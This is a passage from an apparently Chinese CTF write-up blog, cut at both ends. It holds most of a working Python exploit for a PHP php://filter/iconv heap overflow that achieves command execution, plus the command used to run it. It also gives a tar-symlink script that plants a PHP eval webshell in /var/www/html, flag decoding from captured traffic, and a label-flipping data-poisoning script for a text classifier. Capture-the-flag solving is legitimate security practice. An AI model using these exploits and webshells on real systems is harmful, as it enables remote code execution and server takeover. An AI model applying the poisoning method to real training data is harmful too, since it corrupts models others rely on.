    ), f&quot;Command too big (&#123;len(COMMAND)&#125;), it must be strictly inferior to &#123;hex(step4_use_custom_heap_size)&#125;&quot;
    COMMAND = COMMAND.ljust(step4_use_custom_heap_size, b&quot;\x00&quot;)

    step4_use_custom_heap = COMMAND
    step4_use_custom_heap = qpe(step4_use_custom_heap)
    step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)
    step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)
    step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)
    step4_use_custom_heap = compressed_bucket(step4_use_custom_heap)

    pages = (
        step4 * 3
        + step4_pwn
        + step4_custom_heap
        + step4_use_custom_heap
        + step3_overflow
        + pad * self.pad
        + step1 * 3
        + step2_write_ptr
        + step2 * 2
    )

    resource = compress(compress(pages))
    resource = b64(resource)
    resource = f&quot;data:text/plain;base64,&#123;resource.decode()&#125;&quot;

    filters = [
        # Create buckets
        &quot;zlib.inflate&quot;,
        &quot;zlib.inflate&quot;,
        
        # Step 0: Setup heap
        &quot;dechunk&quot;,
        &quot;convert.iconv.L1.L1&quot;,
        
        # Step 1: Reverse FL order
        &quot;dechunk&quot;,
        &quot;convert.iconv.L1.L1&quot;,
        
        # Step 2: Put fake pointer and make FL order back to normal
        &quot;dechunk&quot;,
        &quot;convert.iconv.L1.L1&quot;,
        
        # Step 3: Trigger overflow
        &quot;dechunk&quot;,
        &quot;convert.iconv.UTF-8.ISO-2022-CN-EXT&quot;,
        
        # Step 4: Allocate at arbitrary address and change zend_mm_heap
        &quot;convert.quoted-printable-decode&quot;,
        &quot;convert.iconv.L1.L1&quot;,
    ]
    filters = &quot;|&quot;.join(filters)
    path = f&quot;php://filter/read=&#123;filters&#125;/resource=&#123;resource&#125;&quot;

    return path

@inform(&quot;Triggering...&quot;)
def exploit(self) -&gt; None:
    path = self.build_exploit_path()
    start = time.time()

    try:
        self.remote.send(path)
    except (ConnectionError, ChunkedEncodingError):
        pass
    
    msg_print()
    
    if not self.sleep:
        msg_print(&quot;    [b white on black] EXPLOIT [/][b white on green] SUCCESS [/] [i](probably)[/]&quot;)
    elif start + self.sleep &lt;= time.time():
        msg_print(&quot;    [b white on black] EXPLOIT [/][b white on green] SUCCESS [/]&quot;)
    else:
        # Wrong heap, maybe? If the exploited suggested others, use them!
        msg_print(&quot;    [b white on black] EXPLOIT [/][b white on red] FAILURE [/]&quot;)
    
    msg_print()
</code></pre>
<p>def compress(data) -&gt; bytes:<br>    “””Returns data suitable for <code>zlib.inflate</code>.<br>    “””<br>    # Remove 2-byte header and 4-byte checksum<br>    return zlib.compress(data, 9)[2:-4]</p>
<p>def b64(data: bytes, misalign&#x3D;True) -&gt; bytes:<br>    payload &#x3D; base64.encode(data)<br>    if not misalign and payload.endswith(“&#x3D;”):<br>        raise ValueError(f”Misaligned: {data}”)<br>    return payload.encode()</p>
<p>def compressed_bucket(data: bytes) -&gt; bytes:<br>    “””Returns a chunk of size 0x8000 that, when dechunked, returns the data.”””<br>    return chunked_chunk(data, 0x8000)</p>
<p>def qpe(data: bytes) -&gt; bytes:<br>    “””Emulates quoted-printable-encode.<br>    “””<br>    return “”.join(f”&#x3D;{x:02x}” for x in data).upper().encode()</p>
<p>def ptr_bucket(*ptrs, size&#x3D;None) -&gt; bytes:<br>    “””Creates a 0x8000 chunk that reveals pointers after every step has been ran.”””<br>    if size is not None:<br>        assert len(ptrs) * 8 &#x3D;&#x3D; size<br>    bucket &#x3D; b””.join(map(p64, ptrs))<br>    bucket &#x3D; qpe(bucket)<br>    bucket &#x3D; chunked_chunk(bucket)<br>    bucket &#x3D; chunked_chunk(bucket)<br>    bucket &#x3D; chunked_chunk(bucket)<br>    bucket &#x3D; compressed_bucket(bucket)</p>
<pre><code>return bucket
</code></pre>
<p>def chunked_chunk(data: bytes, size: int &#x3D; None) -&gt; bytes:<br>    “””Constructs a chunked representation of the given chunk. If size is given, the<br>    chunked representation has size <code>size</code>.<br>    For instance, <code>ABCD</code> with size 10 becomes: <code>0004\nABCD\n</code>.<br>    “””<br>    # The caller does not care about the size: let’s just add 8, which is more than<br>    # enough<br>    if size is None:<br>        size &#x3D; len(data) + 8<br>    keep &#x3D; len(data) + len(b”\n\n”)<br>    size &#x3D; f”{len(data):x}”.rjust(size - keep, “0”)<br>    return size.encode() + b”\n” + data + b”\n”</p>
<p>@dataclass<br>class Region:<br>    “””A memory region.”””</p>
<pre><code>start: int
stop: int
permissions: str
path: str

@property
def size(self) -&gt; int:
    return self.stop - self.start
</code></pre>
<p>Exploit()</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">脚本执行了三个请求：首先下载`/proc/self/maps`文件，并从中提取PHP堆的地址和libc库的文件名.接着下载libc二进制文件来提取`system()`函数的地址.最后执行一次最终请求来触发溢出并执行预设的任意命令.</span><br><span class="line"></span><br><span class="line">我们修改以下代码段</span><br><span class="line"></span><br><span class="line">```python</span><br><span class="line">    def download(self, path: str) -&gt; bytes:</span><br><span class="line">        &quot;&quot;&quot;Returns the contents of a remote file.</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">        path = f&quot;php://filter/convert.base64-encode/resource=&#123;path&#125;&quot;</span><br><span class="line">        response = self.send(path)</span><br><span class="line">        data = response.re.search(b&quot;File Contents:(.*)&quot;, flags=re.S).group(1)</span><br><span class="line">        return base64.decode(data)</span><br></pre></td></tr></table></figure>

<p>把b”xxx”改为实际的回显值,比如我是<code>File Contents:</code>,然后利用poc即可</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python ccb.py https://eci-2zeg5tzl30km0vqs6523.cloudeci1.ichunqiu.com:80/?exp=1 <span class="string">&quot;../../../../readflag &gt; /tmp/2.txt&quot;</span></span><br></pre></td></tr></table></figure>



<p><img src="/images/image-20250914115500418.png"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;c2ce00b5-c2a8-4031-bfb2-dcc046dc4601&#125;</span><br></pre></td></tr></table></figure>

<h2 id="EZ-upload"><a href="#EZ-upload" class="headerlink" title="EZ_upload"></a>EZ_upload</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">handleFileUpload</span>(<span class="params"><span class="variable">$file</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$uploadDirectory</span> = <span class="string">&#x27;/tmp/&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$file</span>[<span class="string">&#x27;error&#x27;</span>] !== UPLOAD_ERR_OK) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;文件上传失败。&#x27;</span>;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$filename</span> = <span class="title function_ invoke__">basename</span>(<span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">    <span class="variable">$filename</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[^a-zA-Z0-9_\-\.]/&#x27;</span>, <span class="string">&#x27;_&#x27;</span>, <span class="variable">$filename</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$filename</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;文件名不符合要求。&#x27;</span>;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$destination</span> = <span class="variable">$uploadDirectory</span> . <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$file</span>[<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$destination</span>)) &#123;</span><br><span class="line">        <span class="title function_ invoke__">exec</span>(<span class="string">&#x27;cd /tmp &amp;&amp; tar -xvf &#x27;</span> . <span class="variable">$filename</span>.<span class="string">&#x27;&amp;&amp;pwd&#x27;</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$destination</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;文件移动失败。&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">handleFileUpload</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>源码首先对文件名进行了过滤，无法直接拼接命令，文件传入&#x2F;tmp目录后会通过 tar -xvf 进行解压</p>
<p>我们可以尝试构造一个软链接，来实现可写目录&#x2F;tmp和不可写目录&#x2F;var&#x2F;www&#x2F;html的链接</p>
<p>接下来我们的思路就是，首先创建一个tar压缩包，创建两个目录的软链接，然后再上传一个包含一句话木马的压缩包去读取flag</p>
<p>tar文件在打包时，可以将一个符号链接（symlink）本身记录到归档文件中，类似于 windows 的快捷方式，于是我们可以利用这个符号链接特性，实现将Webshell写入目标网站目录</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> tarfile</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line">webshell_content = <span class="string">b&#x27;&lt;?php @eval($_POST[&quot;cmd&quot;]); ?&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line">webshell_name = <span class="string">&quot;shell.php&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">link_name = <span class="string">&quot;test&quot;</span></span><br><span class="line"></span><br><span class="line">target_dir = <span class="string">&quot;/var/www/html&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;正在创建 link.tar...&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;这个包将在 /tmp 目录下创建一个符号链接 &#x27;<span class="subst">&#123;link_name&#125;</span>&#x27; 指向 &#x27;<span class="subst">&#123;target_dir&#125;</span>&#x27;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> tarfile.<span class="built_in">open</span>(<span class="string">&quot;link.tar&quot;</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> tar:</span><br><span class="line"></span><br><span class="line">    link_info = tarfile.TarInfo(name=link_name)</span><br><span class="line">link_info.<span class="built_in">type</span> = tarfile.SYMTYPE  </span><br><span class="line">link_info.linkname = target_dir   </span><br><span class="line">tar.addfile(link_info)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;link.tar 创建成功！&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;-&quot;</span> * <span class="number">30</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;正在创建 webshell.tar...&quot;</span>)</span><br><span class="line">path_in_tar = os.path.join(link_name, webshell_name)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;这个包将把 &#x27;<span class="subst">&#123;webshell_name&#125;</span>&#x27; 写入到路径 &#x27;<span class="subst">&#123;path_in_tar&#125;</span>&#x27;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> tarfile.<span class="built_in">open</span>(<span class="string">&quot;webshell.tar&quot;</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> tar:</span><br><span class="line"></span><br><span class="line">    file_info = tarfile.TarInfo(name=path_in_tar)</span><br><span class="line">file_info.size = <span class="built_in">len</span>(webshell_content)</span><br><span class="line"></span><br><span class="line">tar.addfile(file_info, BytesIO(webshell_content))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;webshell.tar 创建成功！&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;-&quot;</span> * <span class="number">30</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;请按顺序上传这两个文件。&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>我们先上传一个link.tar,作用是创建test与&#x2F;var&#x2F;www&#x2F;html的symlink</p>
<p>再次上传webshell.tar,tar中存在test&#x2F;shell.php</p>
<p>在解压的时候test被解析为符号链接,所以实际写入路径就是&#x2F;var&#x2F;www&#x2F;html&#x2F;shell.php</p>
<p><img src="/images/640.webp" alt="图片"></p>
<h2 id="RealChekIn-1"><a href="#RealChekIn-1" class="headerlink" title="RealChekIn-1"></a>RealChekIn-1</h2><p>过滤http流,发现存在&#x2F;login?cmd&#x3D;whoami,追踪流</p>
<p>拉到最底下,发现存在fffllagg1.txt</p>
<p><img src="/images/image-20250914130549647.png" alt="image-20250914130549647"></p>
<p>再看http.request.method&#x3D;&#x3D;”POST”</p>
<p>在1102流里发现flag</p>
<p><img src="/images/image-20250917191955949.png" alt="image-20250917191955949"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">s = <span class="string">&#x27;Z.m.x.h.Z.3.t.k.O.T.g.4.Z.W.I.1.Z.m.N.k.Y.T.E.0.O.D.h.m.Y.T.N.k.M.z.A.y.N.G.E.4.N.z.g.w.Y.m.J.j.Z.H.0.=&#x27;</span></span><br><span class="line">re = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">    <span class="keyword">if</span> i != <span class="string">&#x27;.&#x27;</span>:</span><br><span class="line">        re.append(i)</span><br><span class="line">result = <span class="string">&#x27;&#x27;</span>.join(re)</span><br><span class="line">decoded = base64.b64decode(result).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(decoded)</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">flag&#123;d988eb5fcda1488fa3d3024a8780bbcd&#125;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>

<h2 id="AI-easy-posion"><a href="#AI-easy-posion" class="headerlink" title="AI easy_posion"></a>AI easy_posion</h2><p>ai数据投毒攻击,根据代码不难看出, val_set 文件中存放着正确的训练集,我们为了获取被污染的模型,就要在训练集中添加错误样本</p>
<p><img src="/images/image-20250917194610455.png" alt="image-20250917194610455"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">result_details_list = []</span><br><span class="line"><span class="keyword">for</span> res <span class="keyword">in</span> validation_results:</span><br><span class="line">    detail_str = (</span><br><span class="line">        <span class="string">f&quot;秘密验证样本: &#x27;<span class="subst">&#123;res[<span class="string">&#x27;text&#x27;</span>]&#125;</span>&#x27;\n&quot;</span></span><br><span class="line">        <span class="string">f&quot;  - 原始标签 (来自val_set.csv): <span class="subst">&#123;res[<span class="string">&#x27;original&#x27;</span>]&#125;</span>\n&quot;</span></span><br><span class="line">        <span class="string">f&quot;  - 攻击目标 (应预测为): <span class="subst">&#123;res[<span class="string">&#x27;expected_attack&#x27;</span>]&#125;</span>\n&quot;</span></span><br><span class="line">        <span class="string">f&quot;  - 你的模型预测: <span class="subst">&#123;res[<span class="string">&#x27;predicted&#x27;</span>]&#125;</span>  [--&gt; <span class="subst">&#123;res[<span class="string">&#x27;success&#x27;</span>]&#125;</span>]&quot;</span></span><br><span class="line">    )</span><br><span class="line">    result_details_list.append(detail_str)</span><br></pre></td></tr></table></figure>

<p>通过脚本自动添加攻击样本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"><span class="keyword">import</span> torch.nn <span class="keyword">as</span> nn</span><br><span class="line"><span class="keyword">import</span> torch.nn.functional <span class="keyword">as</span> F</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> Counter</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> src.model <span class="keyword">import</span> TextClassifier, Run</span><br><span class="line"><span class="keyword">from</span> src.parameters <span class="keyword">import</span> Parameters</span><br><span class="line"></span><br><span class="line">TRAIN_PATH = <span class="string">&quot;./data/train_set.csv&quot;</span></span><br><span class="line">VAL_PATH   = <span class="string">&quot;./data/val_set.csv&quot;</span>  <span class="comment"># 本地模拟</span></span><br><span class="line">OUTPUT_DIR = <span class="string">&quot;uploads&quot;</span></span><br><span class="line">OUTPUT_FILE = <span class="string">&quot;auto_poisoned_model.pth&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ------------------------</span></span><br><span class="line"><span class="comment"># 文本清理与分词</span></span><br><span class="line"><span class="comment"># ------------------------</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">normalize_text</span>(<span class="params">text</span>):</span><br><span class="line">    text = text.lower()</span><br><span class="line">    text = re.sub(<span class="string">r&quot;[^a-z]+&quot;</span>, <span class="string">&quot; &quot;</span>, text)</span><br><span class="line">    <span class="keyword">return</span> text.strip()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tokenize</span>(<span class="params">text</span>):</span><br><span class="line">    <span class="keyword">return</span> text.split() <span class="keyword">if</span> text <span class="keyword">else</span> []</span><br><span class="line"></span><br><span class="line"><span class="comment"># ------------------------</span></span><br><span class="line"><span class="comment"># 构建词表</span></span><br><span class="line"><span class="comment"># ------------------------</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">make_vocab</span>(<span class="params">texts, max_words</span>):</span><br><span class="line">    counter = Counter()</span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> texts:</span><br><span class="line">        counter.update(tokenize(normalize_text(t)))</span><br><span class="line">    most_common = counter.most_common(<span class="built_in">max</span>(<span class="number">0</span>, max_words-<span class="number">1</span>))</span><br><span class="line">    vocab = &#123;w: i+<span class="number">1</span> <span class="keyword">for</span> i, (w, _) <span class="keyword">in</span> <span class="built_in">enumerate</span>(most_common)&#125;  <span class="comment"># 0 留给 PAD</span></span><br><span class="line">    <span class="keyword">return</span> vocab</span><br><span class="line"></span><br><span class="line"><span class="comment"># ------------------------</span></span><br><span class="line"><span class="comment"># 文本编码 + 填充</span></span><br><span class="line"><span class="comment"># ------------------------</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">text_to_sequence</span>(<span class="params">text, vocab, seq_len</span>):</span><br><span class="line">    tokens = tokenize(normalize_text(text))</span><br><span class="line">    ids = [vocab.get(tok, <span class="number">0</span>) <span class="keyword">for</span> tok <span class="keyword">in</span> tokens]</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(ids) &lt; seq_len:</span><br><span class="line">        ids += [<span class="number">0</span>]*(seq_len - <span class="built_in">len</span>(ids))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        ids = ids[:seq_len]</span><br><span class="line">    <span class="keyword">return</span> ids</span><br><span class="line"></span><br><span class="line"><span class="comment"># ------------------------</span></span><br><span class="line"><span class="comment"># 本地生成模拟 val_set.csv</span></span><br><span class="line"><span class="comment"># ------------------------</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_local_val_set</span>():</span><br><span class="line">    <span class="keyword">if</span> os.path.exists(VAL_PATH):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[*] 本地验证集已存在 -&gt; <span class="subst">&#123;VAL_PATH&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    val_texts = [</span><br><span class="line">        <span class="string">&quot;Massive earthquake hits northern Japan&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Flood in central Europe&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Minor traffic accident downtown&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Fire breaks out in a warehouse&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Severe storm approaching west coast&quot;</span></span><br><span class="line">    ]</span><br><span class="line">    val_labels = [<span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>]  <span class="comment"># 模拟标签</span></span><br><span class="line">    val_df = pd.DataFrame(&#123;<span class="string">&quot;text&quot;</span>: val_texts, <span class="string">&quot;target&quot;</span>: val_labels&#125;)</span><br><span class="line">    os.makedirs(os.path.dirname(VAL_PATH), exist_ok=<span class="literal">True</span>)</span><br><span class="line">    val_df.to_csv(VAL_PATH, index=<span class="literal">False</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] 已生成本地模拟验证集 -&gt; <span class="subst">&#123;VAL_PATH&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ------------------------</span></span><br><span class="line"><span class="comment"># 准备训练数据（包含自动投毒）</span></span><br><span class="line"><span class="comment"># ------------------------</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">prepare_training_data</span>(<span class="params">params</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(TRAIN_PATH):</span><br><span class="line">        <span class="keyword">raise</span> FileNotFoundError(<span class="string">f&quot;<span class="subst">&#123;TRAIN_PATH&#125;</span> 不存在&quot;</span>)</span><br><span class="line">    generate_local_val_set()  <span class="comment"># 生成本地 val_set</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># --- 清洗训练集 ---</span></span><br><span class="line">    train_df = pd.read_csv(TRAIN_PATH)</span><br><span class="line">    text_col = <span class="string">&quot;text&quot;</span> <span class="keyword">if</span> <span class="string">&quot;text&quot;</span> <span class="keyword">in</span> train_df.columns <span class="keyword">else</span> train_df.columns[<span class="number">0</span>]</span><br><span class="line">    label_col = <span class="string">&quot;target&quot;</span> <span class="keyword">if</span> <span class="string">&quot;target&quot;</span> <span class="keyword">in</span> train_df.columns <span class="keyword">else</span> train_df.columns[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">    train_df = train_df[[text_col, label_col]].dropna(subset=[label_col])</span><br><span class="line">    train_df = train_df[train_df[label_col].isin([<span class="number">0</span>,<span class="number">1</span>])]</span><br><span class="line"></span><br><span class="line">    train_texts = train_df[text_col].astype(<span class="built_in">str</span>).tolist()</span><br><span class="line">    train_labels = train_df[label_col].astype(<span class="built_in">int</span>).tolist()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># --- 构建词表 ---</span></span><br><span class="line">    vocab = make_vocab(train_texts, params.num_words)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># --- 编码训练集 ---</span></span><br><span class="line">    seqs_train = np.array([text_to_sequence(t, vocab, params.seq_len) <span class="keyword">for</span> t <span class="keyword">in</span> train_texts], dtype=np.int64)</span><br><span class="line">    labels_train = np.array(train_labels, dtype=np.int64)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># --- 自动生成投毒样本（反转验证集标签） ---</span></span><br><span class="line">    val_df = pd.read_csv(VAL_PATH)</span><br><span class="line">    val_df = val_df[[<span class="string">&#x27;text&#x27;</span>,<span 